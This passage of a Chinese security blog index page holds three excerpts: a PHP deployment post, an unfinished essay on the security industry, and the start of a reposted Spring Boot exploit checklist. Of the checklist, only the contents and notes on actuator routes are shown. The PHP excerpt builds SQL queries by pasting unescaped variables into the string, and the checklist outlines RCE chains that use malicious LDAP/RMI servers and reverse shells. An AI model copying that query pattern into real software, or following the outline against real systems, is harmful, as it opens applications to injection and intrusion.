define('DB_TYPE', "mysql"); 
define('IMAGE_URL', "http://61.191.35.32:8580/BabyOnline/");
define('DB_SOURCEFILE_PATH',dirname(dirname(dirname(__FILE__)))."/utility/dbsource.ini");
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">dbsource.ini</code>文件里面则详细配置了jdbc的配置信息，就不单独放出来了；再来看看最后一个文件，同样是连接数据库，然后发现了一些有趣的：
随意捡了一些构造函数：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function QueryRecordCount($sqlstr)
	{
		if($this-&gt;connect)
		{
			unset($row);
			$row=$this-&gt;FetchArray($this-&gt;Query("SELECT count(1) as RecordCount FROM ".$sqlstr." "));
			return ($row['RecordCount'] &gt; 0 ? $row['RecordCount'] : 0);
		}
		else
		{
			return 0;
		}
	}


if($link-&gt;FetchArray($link-&gt;query("SELECT * FROM User WHERE `Identity`='$UserId' AND AreaCode='$AreaCode'")))
    {
    ···
    }
</code></pre></div></div>
<p>咳咳，跑偏了，以上来看就直接修改ini文件就行了。</p>

          <p><a href="/blog/2020/php-depoly/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/think-about-cyber-security/"><h3 class="ctitle">有关于网络安全行业的一些思考</h3></a>
          <p><csmall>Sep 25, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h3 id="under-construction">Under construction</h3>
<hr />

<div class="d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4">

<!-- this is a gap between text and pics:) -->
</div>

<div class="d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4">

<!-- this is a gap between text and pics:) -->
</div>
<div class="d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4">

<!-- this is a gap between text and pics:) -->
</div>

<div class="d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4">
<div class="width-full">
<svg viewBox="0 0 300 305" class="width-fit">
<defs>
<mask id="https___github_githubassets_com_images_modules_site_home_astro-mona-alpha_jpg">
<image width="300" height="305" href="/assets/img/post-bg/astro-mona-alpha.jpg"></image>
</mask>
</defs>
<image mask="url(#https___github_githubassets_com_images_modules_site_home_astro-mona-alpha_jpg)" width="300" height="305" href="/assets/img/post-bg/astro-mona.jpg"></image>
</svg>
</div>
</div>

<hr />

<p>在当今网络安全行业趋于商业化的时代，如何能够保持一颗赤忱之心：</p>

<ul>
  <li>当今网络安全之趋势，当在国家安全的大前提下：
    <ul>
      <li>
        <p>教育行业应作为网络安全的”活水源头”，为这个年轻的行业输入足够的年轻血液，所以在此刻：<br />
  应当充分发挥教育职能的同时，对当下应用型、研究型专业的莘莘学子做有必要的引导；<br />
  因为当下很多学生、教师在当下行业无法认清自我，永远无法在正确的时间，做正确的事；</p>
      </li>
      <li>企业在这其中也扮演重要角色：
显而易见的是，传统安全企业也面临着的抉择：</li>
      <li>适应市场或者是自己选择游戏规则；
        <ul>
          <li>大部分传统安全厂商选择的是适应市场
            <ul>
              <li>安服需求；夺旗需求；应付工信部门检查等。。。</li>
            </ul>
          </li>
          <li>爱加密等厂商：
            <ul>
              <li>自己创造需求，创造游戏规则。</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<blockquote>
  <p>对处于实习期的学生做好职业引导，网络安全行业在未来十年不会成为国家命脉行业，安全行业仅仅作为安全服务的形式为大众所熟知，如今的网络安全行业：</p>

  <p>国家层面：CTF赛事；护网行动；重大节日保障</p>

  <p>企业层面：工信局部门检查；等保；自身企业业务安全保障(一般来说，越针对自身企业业务有安全需求的公司，都拥有自己的安全团队)</p>

  <p>个人层面：个人数据、隐私、财产问题；</p>
</blockquote>

<h2 id="零当下网络安全行业ctf赛事之我见">零、当下网络安全行业CTF赛事之我见</h2>

<!--	oopos！被你发现了！
* it工作人员（包括运维、开发等等）公司内的矛盾

* 软件开发和传统安全公司之间的矛盾

网络防火墙作为访问控制设备，主要工作在OSI模型三、四层，基于IP报文进行检测。只是对端口做限制，对TCP协议做封堵。
其产品设计无需理解HTTP会话，也就决定了无法理解Web应用程序语言如HTML、SQL语言。因此，它不可能对HTTP通讯进行输入验证或攻击规则分析。针对Web网站的恶意攻击绝大部分都将封装为HTTP请求，从80或443端口顺利通过防火墙检测。 
一些定位比较综合、提供丰富功能的防火墙，也具备一定程度的应用层防御能力，如能根据TCP会话异常性及攻击特征阻止网络层的攻击，通过IP分拆和组合也能判断是否有攻击隐藏在多个数据包中，但从根本上说他仍然无法理解HTTP会话，难以应对如SQL注入、跨站脚本、cookie窃取、网页篡改等应用层攻击。 
web应用防火墙能在应用层理解分析HTTP会话，因此能有效的防止各类应用层攻击，同时他向下兼容，具备网络防火墙的功能。 -->

<html>
<head>
	<title></title>
<!-- <link href="/assets/css/bg.css" rel="stylesheet"> -->
<script>
var consoleConfig = {
welcome: '\n哈？(づ｡◕‿‿◕｡)づ！你在偷看什么。本文还在"思考"中...\n',
theme: '\n1、it工作人员（包括运维、开发等等）公司内的矛盾\n2、软件开发和传统安全公司之间的矛盾  \n\n源码:https://github.com/Bin4xin/bin4xin.github.io \n\n如果喜欢可以 %c star%c  %c支持一下%c  ❤️~\n',

};

var consoleInfo = (function(consoleConfig) {
console.log('%c' + consoleConfig.welcome, 'color: #6190e8');
console.log('%c' + consoleConfig.theme, 'color: #6190e8;','padding: 0 5px;color: #fff;background: #6190e8;','color: #6190e8;','padding: 0 5px;color: #fff;background: #6190e8;','color: #6190e8;');
console.log('%c' + consoleConfig.qrcode, 'color: #6190e8');
console.log('%c' + consoleConfig.search, 'color: #6190e8');

}(consoleConfig));</script>
</head>
<body>

</body>
</html>

          <p><a href="/blog/2020/think-about-cyber-security/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/Spring-boot/"><h3 class="ctitle">不得不谈的：「Spring Boot」未授权渗透</h3></a>
          <p><csmall>Sep 25, 2020. | By: Bin4xin edit.Source From LandGrey</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h4 id="spring-boot-vulnerability-exploit-checklist">Spring Boot Vulnerability Exploit CheckList</h4>

<p>Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list</p>

<h3 id="声明">声明</h3>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit">这是转载地址</a>，
<strong>若作者介意请联系：「chihou.pro@gmail.com」删除转载文章</strong></p>

<h2 id="目录">目录</h2>

<ul>
  <li><a href="#spring-boot-vulnerability-exploit-checklist">Spring Boot Vulnerability Exploit CheckList</a>
    <ul>
      <li><a href="#%E9%9B%B6%E8%B7%AF%E7%94%B1%E5%92%8C%E7%89%88%E6%9C%AC">零：路由和版本</a>
        <ul>
          <li><a href="#0x01%E8%B7%AF%E7%94%B1%E7%9F%A5%E8%AF%86">0x01：路由知识</a></li>
          <li><a href="#0x02%E7%89%88%E6%9C%AC%E7%9F%A5%E8%AF%86">0x02：版本知识</a>
            <ul>
              <li><a href="#%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6%E7%9A%84%E7%89%88%E6%9C%AC%E7%9B%B8%E4%BA%92%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB">常见组件的版本相互依赖关系：</a></li>
              <li><a href="#spring-cloud-%E4%B8%8E-spring-boot-%E5%A4%A7%E7%89%88%E6%9C%AC%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB">Spring Cloud 与 Spring Boot 大版本之间的依赖关系：</a></li>
              <li><a href="#spring-cloud-%E5%B0%8F%E7%89%88%E6%9C%AC%E5%8F%B7%E7%9A%84%E5%90%8E%E7%BC%80%E5%8F%8A%E5%90%AB%E4%B9%89">Spring Cloud 小版本号的后缀及含义:</a></li>
            </ul>
          </li>
        </ul>
      </li>
      <li><a href="#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">一：信息泄露</a>
        <ul>
          <li><a href="#0x01%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F">0x01：路由地址及接口调用详情泄漏</a></li>
          <li><a href="#0x02%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1">0x02：配置不当而暴露的路由</a></li>
          <li><a href="#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80">0x03：获取被星号脱敏的密码的明文 (方法一)</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D">步骤一： 找到想要获取的属性名</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-jolokia-%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3-mbean-%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87">步骤二： jolokia 调用相关 Mbean 获取明文</a></li>
                </ul>
              </li>
            </ul>
          </li>
          <li><a href="#0x04%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%BA%8C">0x04：获取被星号脱敏的密码的明文 (方法二)</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-1">步骤一： 找到想要获取的属性名</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82">步骤二： 使用 nc 监听 HTTP 请求</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7">步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE">步骤四： 刷新配置</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94-%E8%A7%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%80%BC">步骤五： 解码属性值</a></li>
                </ul>
              </li>
            </ul>
          </li>
          <li><a href="#0x05%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%89">0x05：获取被星号脱敏的密码的明文 (方法三)</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-2">步骤一： 找到想要获取的属性名</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82-1">步骤二： 使用 nc 监听 HTTP 请求</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%A7%A6%E5%8F%91%E5%AF%B9%E5%A4%96-http-%E8%AF%B7%E6%B1%82">步骤三： 触发对外 http 请求</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1">步骤四： 刷新配置</a></li>
                </ul>
              </li>
            </ul>
          </li>
          <li><a href="#0x06%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E5%9B%9B">0x06：获取被星号脱敏的密码的明文 (方法四)</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-3">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-3">步骤一： 找到想要获取的属性名</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%B8%8B%E8%BD%BD-jvm-heap-%E4%BF%A1%E6%81%AF">步骤二： 下载 jvm heap 信息</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E4%BD%BF%E7%94%A8-mat-%E8%8E%B7%E5%BE%97-jvm-heap-%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87">步骤三： 使用 MAT 获得 jvm heap 中的密码明文</a></li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li><a href="#%E4%BA%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">二：远程代码执行</a>
        <ul>
          <li><a href="#0x01whitelabel-error-page-spel-rce">0x01：whitelabel error page SpEL RCE</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-4">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%AD%A3%E5%B8%B8%E4%BC%A0%E5%8F%82%E5%A4%84">步骤一：找到一个正常传参处</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%A7%E8%A1%8C-spel-%E8%A1%A8%E8%BE%BE%E5%BC%8F">步骤二：执行 SpEL 表达式</a></li>
                </ul>
              </li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">漏洞环境：</a></li>
            </ul>
          </li>
          <li><a href="#0x02spring-cloud-snakeyaml-rce">0x02：spring cloud SnakeYAML RCE</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-5">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%98%E7%AE%A1-yml-%E5%92%8C-jar-%E6%96%87%E4%BB%B6">步骤一： 托管 yml 和 jar 文件</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E8%AE%BE%E7%BD%AE-springcloudbootstraplocation-%E5%B1%9E%E6%80%A7">步骤二： 设置 spring.cloud.bootstrap.location 属性</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE">步骤三： 刷新配置</a></li>
                </ul>
              </li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1">漏洞原理：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1">漏洞分析：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1">漏洞环境：</a></li>
            </ul>
          </li>
          <li><a href="#0x03eureka-xstream-deserialization-rce">0x03：eureka xstream deserialization RCE</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-6">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-6">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9E%B6%E8%AE%BE%E5%93%8D%E5%BA%94%E6%81%B6%E6%84%8F-xstream-payload-%E7%9A%84%E7%BD%91%E7%AB%99">步骤一：架设响应恶意 XStream payload 的网站</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3">步骤二：监听反弹 shell 的端口</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE">步骤四：刷新配置</a></li>
                </ul>
              </li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2">漏洞原理：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2">漏洞分析：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-2">漏洞环境：</a></li>
            </ul>
          </li>
          <li><a href="#0x04jolokia-logback-jndi-rce">0x04：jolokia logback JNDI RCE</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-7">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-7">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans">步骤一：查看已存在的 MBeans</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%98%E7%AE%A1-xml-%E6%96%87%E4%BB%B6">步骤二：托管 xml 文件</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81">步骤三：准备要执行的 Java 代码</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1">步骤四：架设恶意 ldap 服务</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3">步骤五：监听反弹 shell 的端口</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E4%BB%8E%E5%A4%96%E9%83%A8-url-%E5%9C%B0%E5%9D%80%E5%8A%A0%E8%BD%BD%E6%97%A5%E5%BF%97%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">步骤六：从外部 URL 地址加载日志配置文件</a></li>
                </ul>
              </li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3">漏洞原理：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3">漏洞分析：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-3">漏洞环境：</a></li>
            </ul>
          </li>
          <li><a href="#0x05jolokia-realm-jndi-rce">0x05：jolokia Realm JNDI RCE</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-8">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-8">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans-1">步骤一：查看已存在的 MBeans</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81">步骤二：准备要执行的 Java 代码</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6">步骤三：托管 class 文件</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rmi-%E6%9C%8D%E5%8A%A1">步骤四：架设恶意 rmi 服务</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-1">步骤五：监听反弹 shell 的端口</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F-payload">步骤六：发送恶意 payload</a></li>
                </ul>
              </li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4">漏洞原理：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4">漏洞分析：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-4">漏洞环境：</a></li>
            </ul>
          </li>
          <li><a href="#0x06h2-database-query-rce">0x06：h2 database query RCE</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-9">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-9">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BE%E7%BD%AE-springdatasourcehikariconnection-test-query-%E5%B1%9E%E6%80%A7">步骤一：设置 spring.datasource.hikari.connection-test-query 属性</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8">步骤二：重启应用</a></li>
                </ul>
              </li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5">漏洞原理：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5">漏洞分析：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-5">漏洞环境：</a></li>
            </ul>
          </li>
          <li><a href="#0x07h2-database-console-jndi-rce">0x07：h2 database console JNDI RCE</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-10">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-10">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BF%E9%97%AE%E8%B7%AF%E7%94%B1%E8%8E%B7%E5%BE%97-jsessionid">步骤一：访问路由获得 jsessionid</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81-1">步骤二：准备要执行的 Java 代码</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6-1">步骤三：托管 class 文件</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1-1">步骤四：架设恶意 ldap 服务</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-2">步骤五：监听反弹 shell 的端口</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E5%8C%85%E8%A7%A6%E5%8F%91-jndi-%E6%B3%A8%E5%85%A5">步骤六：发包触发 JNDI 注入</a></li>
                </ul>
              </li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6">漏洞分析：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-6">漏洞环境：</a></li>
            </ul>
          </li>
          <li><a href="#0x08mysql-jdbc-deserialization-rce">0x08：mysql jdbc deserialization RCE</a>
            <ul>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-11">利用条件：</a></li>
              <li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-11">利用方法：</a>
                <ul>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E4%BE%9D%E8%B5%96">步骤一：查看环境依赖</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rogue-mysql-server">步骤二：架设恶意 rogue mysql server</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-springdatasourceurl-%E5%B1%9E%E6%80%A7">步骤三：设置 spring.datasource.url 属性</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1">步骤四：刷新配置</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E8%A7%A6%E5%8F%91%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2">步骤五：触发数据库查询</a></li>
                  <li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E6%81%A2%E5%A4%8D%E6%AD%A3%E5%B8%B8-jdbc-url">步骤六：恢复正常 jdbc url</a></li>
                </ul>
              </li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-6">漏洞原理：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7">漏洞分析：</a></li>
              <li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-7">漏洞环境：</a></li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h2 id="零路由和版本">零：路由和版本</h2>

<h3 id="0x01路由知识">0x01：路由知识</h3>

<ul>
  <li>Spring Boot 1.x 版本默认内置路由的根路径以  <code class="language-plaintext highlighter-rouge">/</code> 开始，2.x 则统一以 <code class="language-plaintext highlighter-rouge">/actuator</code> 开始</li>
  <li>有些程序员会自定义 <code class="language-plaintext highlighter-rouge">/manage</code>、<code class="language-plaintext highlighter-rouge">/management</code> 或 <strong>项目相关名称</strong> 为根路径</li>
  <li>默认内置路由名字，如 <code class="language-plaintext highlighter-rouge">/env</code> 有时候也会被程序员修改，如修改成 <code class="language-plaintext highlighter-rouge">/appenv</code></li>
</ul>

<h3 id="0x02版本知识">0x02：版本知识</h3>

<blockquote>
  <p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。</p>
</blockquote>

<h4 id="常见组件的版本相互依赖关系">常见组件的版本相互依赖关系：</h4>

<table>
  <thead>
    <tr>
      <th>依赖项</th>
      <th>版本列表及依赖组件版本</th>
    </tr>
  </thead>
  <tbody>
    <tr>
